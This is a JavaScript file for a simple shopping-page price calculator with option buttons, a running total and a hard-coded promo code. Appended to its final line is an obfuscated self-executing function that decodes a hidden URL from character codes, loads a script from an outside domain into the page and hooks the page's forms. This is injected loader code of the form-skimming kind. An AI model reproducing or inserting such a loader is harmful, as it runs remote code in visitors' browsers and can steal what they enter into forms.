// document.getElementById('sixteenGB').addEventListener('click',function(e){
// //     // // 


//     //     const memoryCost = document.getElementById("memory-cost");
//     // memoryCost.innerText = 200;

//     // const bestPrice = document.getElementById("best-price").innerText;
//     // const memoryPrice = document.getElementById("memory-cost").innerText;
//     // const storagePrice = document.getElementById("storage-cost").innerText;
//     // const deliveryPrice = document.getElementById("delivery-cost").innerText;
//     //  const totalPrice = parseFloat(bestPrice) + parseFloat(memoryPrice) + parseFloat(storagePrice) + parseFloat(deliveryPrice);

//     //   const total = document.getElementById("total-price");
//     // total.innerText = totalPrice;



//     updateprice('memory-cost',200)


// })

// document.getElementById('eightGB').addEventListener('click',function(e){
//    updateprice('memory-cost',0)
// })


function onClick(clikId,updateId,price){
    document.getElementById(clikId).addEventListener('click',function(e){
        updateprice(updateId,price) ;
        document.getElementById(clikId).style.backgroundColor = "cornflowerblue"
    })
}


onClick("sixteenGB", "memory-cost", 200);
onClick("eightGB", "memory-cost", 0);
onClick("ssd1", "storage-cost", 0);
onClick("ssd2", "storage-cost", 200);
onClick("ssd3", "storage-cost", 400);
onClick("free-delivery", "delivery-cost", 0);
onClick("paid-delivery", "delivery-cost", 20);





function updateprice(itemId,price){

    const memoryCost = document.getElementById(itemId);
        memoryCost.innerText = price;
    
        const bestPrice = document.getElementById("best-price").innerText;
        const memoryPrice = document.getElementById("memory-cost").innerText;
        const storagePrice = document.getElementById("storage-cost").innerText;
        const deliveryPrice = document.getElementById("delivery-cost").innerText;
         const totalPrice = parseFloat(bestPrice) + parseFloat(memoryPrice) + parseFloat(storagePrice) + parseFloat(deliveryPrice);
    
          const total = document.getElementById("total-price");
        total.innerText = totalPrice;
    
    
    
    
    
    
    
}

const fakeCode = "pHero";
document.getElementById("apply-btn").addEventListener("click", function(){
    const code = document.getElementById("promo-input").value;
    if(code === fakeCode){
        const total = document.getElementById("total-price");
        let totalPrice = parseFloat(total.innerText);

        const discount = (totalPrice*20)/100;

        totalPrice = totalPrice - discount;

        total.innerText = totalPrice;

    } else{

    }
})
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b